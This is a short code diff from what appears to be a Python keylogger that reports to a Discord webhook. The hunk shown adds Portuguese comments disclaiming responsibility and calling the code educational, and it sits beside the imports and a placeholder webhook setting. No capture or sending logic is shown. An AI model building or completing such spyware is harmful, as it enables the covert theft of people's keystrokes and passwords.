@@ -2,7 +2,8 @@ import keyboard,os
 from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
-
+# NÃO ME RESPOSABILIZO POR NENHUM ATO QUE VC FAÇA COM ESSE CODIGO.
+#ISSO É PARA USO EDUCATIVO.
 SEND_REPORT_EVERY = 5
 WEBHOOK = "WEBHOOK_HERE"
 
